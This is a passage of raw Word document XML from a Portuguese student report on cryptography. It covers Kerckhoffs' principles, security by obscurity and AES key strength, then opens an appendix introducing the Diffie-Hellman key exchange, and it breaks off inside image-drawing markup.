        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Ainda assim, se um computador testasse 1T de chaves por segundo precisariamos de 37 (63 zeros).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02521074" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="185" w:name="X250dc3e6e0b2114b4140f161dce03dbe1936980"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Havendo um homem das cavernas ciberseguro e um atacante de idade infinita, acreditamos que depois de 37 (63 zeros), ele já tenha mudado a palavra-passe ou que este segredo já seja irrelevante.</w:t>
      </w:r>
      <w:bookmarkEnd w:id="185"/>
    </w:p>
    <w:p w14:paraId="214DF042" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC" w:rsidP="00392CCA">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4606DDB5" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000" w:rsidP="00392CCA">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="186" w:name="_Toc213874739"/>
      <w:bookmarkStart w:id="187" w:name="_Toc213881977"/>
      <w:r>
        <w:t>2 - Open source de 1883</w:t>
      </w:r>
      <w:bookmarkEnd w:id="186"/>
      <w:bookmarkEnd w:id="187"/>
    </w:p>
    <w:p w14:paraId="10744F69" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="FirstParagraph"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Segundo Kerckhoffs se o sistema é seguro porque é secreto, então esse sistema é fraco. O sistema de encriptação deve ser de “código aberto”.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59171CC6" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Se procurarmos online, encontramos toda a documentação de como criptografar com o AES incluíndo todos os passos.  Assim como também encontramos todos os passos para descriptografar, apesar de, como dito acima, matemáticamente e computacionalmente impossível de o fazer.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66B7C985" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Isto faz com que a segurança por obscuridade (security by obscurity) seja eliminado, já que, existem imensos casos que provam que esta não é eficiente.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33BADB3E" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Se pegarmos num exemplo real, podemos olhar para uma porta e para uma fechadura:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2279B0E4" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="188" w:name="X126336a24774663ba9ab89bfdae997015eb9de3"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Podem ver desde o processo da instalação da fechadura e da porta, até à fundição do ferro ou a plantação da árvore da madeira da porta e mesmo assim, a segurança da casa não deve ser comprometida.</w:t>
      </w:r>
      <w:bookmarkEnd w:id="188"/>
    </w:p>
    <w:p w14:paraId="3183ECBA" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000" w:rsidP="00392CCA">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="189" w:name="_Toc213874740"/>
      <w:bookmarkStart w:id="190" w:name="_Toc213881978"/>
      <w:r>
        <w:t>3 - Aplicação solo</w:t>
      </w:r>
      <w:bookmarkEnd w:id="189"/>
      <w:bookmarkEnd w:id="190"/>
    </w:p>
    <w:p w14:paraId="2D1D6381" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="FirstParagraph"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Até agora, todos os exemplos dados foram feitos a solo e sem dependência do segredo.  Eu posso gerar a minha própria chave para desencriptar um segredo que vou precisar apenas daqui a um tempo, ou até gerar uma chave para desencriptar a minha password do banco, isto tudo completamente sozinho e esta chave sem ser baseada no meu segredo.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B7F0DB9" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>E este é um dos pontos que Kerckhoffs considera importante, podermos criar e esconder segredos sozinhos, porque, lá está, são segredos!</w:t>
      </w:r>
    </w:p>
    <w:bookmarkStart w:id="191" w:name="X807bbb19a013fb3a58dd81ea06c8fdf96cd74e5"/>
    <w:p w14:paraId="343E6573" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1433ACF7" wp14:editId="1D7F4C4F">
                <wp:extent cx="5943600" cy="19046"/>
                <wp:effectExtent l="0" t="0" r="19050" b="19054"/>
                <wp:docPr id="1913526642" name="Retângulo 1885544218"/>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7AD8D9B0" id="Retângulo 1885544218"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bookmarkEnd w:id="191"/>
    </w:p>
    <w:p w14:paraId="58C6AE30" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000" w:rsidP="00392CCA">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="192" w:name="_Toc213874741"/>
      <w:bookmarkStart w:id="193" w:name="_Toc213881979"/>
      <w:r>
        <w:t>Pontos importantes</w:t>
      </w:r>
      <w:bookmarkEnd w:id="192"/>
      <w:bookmarkEnd w:id="193"/>
    </w:p>
    <w:p w14:paraId="5915573B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>A segurança deve ser feita por design e não por obscuridade.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22C04C93" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>A transparência dos protocolos criptográficos aumenta a confiança nestes sistemas.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46466A96" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Atualmente, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>NÃO</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> seguir o terceiro ponto do principio de Kerckhoffs.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1673C566" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>O tamanho da chave deve ser adaptado contra a capacidade computacional atual.</w:t>
      </w:r>
    </w:p>
    <w:bookmarkStart w:id="194" w:name="pontos-importantes"/>
    <w:p w14:paraId="7268A9C7" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="379F3E9A" wp14:editId="733173DB">
                <wp:extent cx="5943600" cy="19046"/>
                <wp:effectExtent l="0" t="0" r="19050" b="19054"/>
                <wp:docPr id="843462871" name="Retângulo 1675392558"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="5943600" cy="19046"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:ln w="0" cap="flat">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:prstDash val="solid"/>
                          <a:miter/>
                        </a:ln>
                      </wps:spPr>
                      <wps:bodyPr lIns="0" tIns="0" rIns="0" bIns="0"/>
                    </wps:wsp>
                  </a:graphicData>
                </a:graphic>
              </wp:inline>
            </w:drawing>
          </mc:Choice>
          <mc:Fallback>
            <w:pict>
              <v:rect w14:anchorId="5E469BB4" id="Retângulo 1675392558"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" strokeweight="0">
                <v:textbox inset="0,0,0,0"/>
                <w10:anchorlock/>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:bookmarkEnd w:id="194"/>
    </w:p>
    <w:p w14:paraId="34461B53" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000" w:rsidP="00392CCA">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="195" w:name="_Toc213874742"/>
      <w:bookmarkStart w:id="196" w:name="_Toc213881980"/>
      <w:r>
        <w:t>Conclusão</w:t>
      </w:r>
      <w:bookmarkEnd w:id="195"/>
      <w:bookmarkEnd w:id="196"/>
    </w:p>
    <w:p w14:paraId="00930584" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="FirstParagraph"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="197" w:name="índice"/>
      <w:bookmarkStart w:id="198" w:name="conclusão"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Para concluir, podemos ver que ainda hoje estes princípios são utilizados, e apesar de alguns serem “outdated”, estes ainda sustentam a criptografia moderna e a boa prática da aplicação e criação da mesma.</w:t>
      </w:r>
      <w:bookmarkEnd w:id="197"/>
      <w:bookmarkEnd w:id="198"/>
    </w:p>
    <w:p w14:paraId="23473B92" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="7EC526BB" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pageBreakBefore/>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6C6BBF57" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="7C98684F" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DE69AB4" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="12C9DCE9" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="652C9150" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="79CF8C84" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="2A4E97B8" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="241F39C0" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="5CF72E4D" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="11B8189E" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="5E95144D" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="1838C2F0" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="549B396B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="61F69B9B" w14:textId="3FF1DAE7" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
      </w:pPr>
      <w:bookmarkStart w:id="199" w:name="_Toc213874743"/>
      <w:bookmarkStart w:id="200" w:name="_Toc213881981"/>
      <w:r>
        <w:t xml:space="preserve">Apêndice C – </w:t>
      </w:r>
      <w:bookmarkEnd w:id="199"/>
      <w:r w:rsidR="00236B3B">
        <w:t>Diffie-Hellman - José</w:t>
      </w:r>
      <w:r w:rsidR="00371B58">
        <w:t xml:space="preserve"> Couto, nº2024026</w:t>
      </w:r>
      <w:bookmarkEnd w:id="200"/>
    </w:p>
    <w:p w14:paraId="2AE94B9F" w14:textId="77777777" w:rsidR="00371B58" w:rsidRDefault="00371B58" w:rsidP="00371B58"/>
    <w:p w14:paraId="48E6C1B1" w14:textId="57A16EE7" w:rsidR="00371B58" w:rsidRDefault="00371B58">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F9EFE45" w14:textId="6817A0D3" w:rsidR="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Teste Individual</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="122883E5" w14:textId="22D5D026" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Diffie-Hellman</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37589FDD" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve">O </w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Diffie-Hellman</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve"> é um </w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>algoritmo de criptografia fundamental</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve"> que marcou o início da era moderna da segurança digital. Ele permite que duas partes estabeleçam </w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>uma chave secreta compartilhada</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve"> mesmo através de um canal inseguro, sem que terceiros consigam interceptá-la ou descobri-la.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DF9B98D" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve">Criado em </w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>1976</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve"> por </w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Whitfield Diffie</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve"> e </w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Martin Hellman</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve">, foi apresentado no artigo clássico </w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>“New Directions in Cryptography”</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve">. Antes do Diffie-Hellman, não havia métodos confiáveis para trocar </w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>chaves criptográficas</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve"> de forma segura através de canais vulneráveis, como a internet.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50502F03" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve">Em termos simples, o algoritmo permite que duas pessoas combinem informações públicas para gerar </w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>uma chave secreta única</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve">, que depois pode ser usada para </w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>criptografar mensagens</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve"> de forma segura, garantindo confidencialidade mesmo em redes potencialmente perigosas.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F28694C" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve">O </w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Diffie-Hellman Key Exchange</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve"> não é usado para encriptar dados diretamente; ele serve para que duas partes gerem </w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>uma chave secreta comum</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t>. Essa chave pode depois ser usada com um algoritmo simétrico (como AES).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C5C4EF8" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve">O princípio baseia-se em propriedades da </w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>aritmética modular</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve"> e na </w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>dificuldade do problema do logaritmo discreto</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C4E4913" w14:textId="324C8895" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <mc:AlternateContent>
          <mc:Choice Requires="wpg">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0C489F35" wp14:editId="676F423A">
                <wp:extent cx="2788920" cy="4049506"/>
                <wp:effectExtent l="0" t="0" r="0" b="27305"/>
                <wp:docPr id="259402619" name="Agrupar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8920" cy="4049506"/>
                          <a:chOff x="1331" y="737"/>
                          <a:chExt cx="25168" cy="36601"/>
                        </a:xfrm>
                      </wpg:grpSpPr>
                      <pic:pic xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture">
                        <pic:nvPicPr>
                          <pic:cNvPr id="1086264945" name="Shape 2"/>
                          <pic:cNvPicPr preferRelativeResize="0">
                            <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
                          </pic:cNvPicPr>
                        </pic:nvPicPr>
                        <pic:blipFill>
                          <a:blip r:embed="rId27">
                            <a:extLst>
                              <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                                <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                              </a:ext>
                            </a:extLst>
                          </a:blip>
                          <a:srcRect t="5508"/>
                          <a:stretch>
                            <a:fillRect/>
                          </a:stretch>
                        </pic:blipFill>
                        <pic:spPr bwMode="auto">
                          <a:xfrm>
                            <a:off x="1524" y="3497"/>
                            <a:ext cx="23812" cy="33841"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                          <a:noFill/>
                          <a:extLst>
                            <a:ext uri="{909E8E84-426E-40DD-AFC4-6F175D3DCCD1}">
                              <a14:hiddenFill xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main">
                                <a:solidFill>
                                  <a:srgbClr val="FFFFFF"/>
                                </a:solidFill>
                              </a14:hiddenFill>
                            </a:ext>
                          </a:extLst>
                        </pic:spPr>
                      </pic:pic>
                      <wps:wsp>
                        <wps:cNvPr id="1880372966" name="Retângulo 161554767"/>
                        <wps:cNvSpPr>
                          <a:spLocks noChangeArrowheads="1"/>
                        </wps:cNvSpPr>
                        <wps:spPr bwMode="auto">
                          <a:xfrm>
                            <a:off x="8369" y="3190"/>
                            <a:ext cx="10122" cy="15879"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:ln w="9525">
                            <a:solidFill>
                              <a:srgbClr val="FFFFFF"/>
                            </a:solidFill>
                            <a:round/>
                            <a:headEnd type="none" w="sm" len="sm"/>
                            <a:tailEnd type="none" w="sm" len="sm"/>
                          </a:ln>
                        </wps:spPr>
                        <wps:txbx>
                          <w:txbxContent>
                            <w:p w14:paraId="63FFBF18" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
                              <w:pPr>
                                <w:spacing w:line="240" w:lineRule="auto"/>
                                <w:jc w:val="center"/>
                              </w:pPr>
                            </w:p>
                          </w:txbxContent>
                        </wps:txbx>
                        <wps:bodyPr rot="0" vert="horz" wrap="square" lIns="91425" tIns="91425" rIns="91425" bIns="91425" anchor="ctr" anchorCtr="0" upright="1">
                          <a:noAutofit/>
                        </wps:bodyPr>
                      </wps:wsp>
                      <wps:wsp>
                        <wps:cNvPr id="1761487557" name="Retângulo 1889938234"/>
                        <wps:cNvSpPr>
                          <a:spLocks noChangeArrowheads="1"/>
                        </wps:cNvSpPr>
                        <wps:spPr bwMode="auto">
                          <a:xfrm>
                            <a:off x="8796" y="27324"/>
                            <a:ext cx="9267" cy="10014"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:ln w="9525">
                            <a:solidFill>
                              <a:srgbClr val="FFFFFF"/>
                            </a:solidFill>
                            <a:round/>
                            <a:headEnd type="none" w="sm" len="sm"/>
                            <a:tailEnd type="none" w="sm" len="sm"/>
                          </a:ln>
                        </wps:spPr>
                        <wps:txbx>
                          <w:txbxContent>
                            <w:p w14:paraId="6552E30B" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
                              <w:pPr>
                                <w:spacing w:line="240" w:lineRule="auto"/>
                                <w:jc w:val="center"/>
                              </w:pPr>
                            </w:p>
                          </w:txbxContent>
                        </wps:txbx>
                        <wps:bodyPr rot="0" vert="horz" wrap="square" lIns="91425" tIns="91425" rIns="91425" bIns="91425" anchor="ctr" anchorCtr="0" upright="1">
                          <a:noAutofit/>
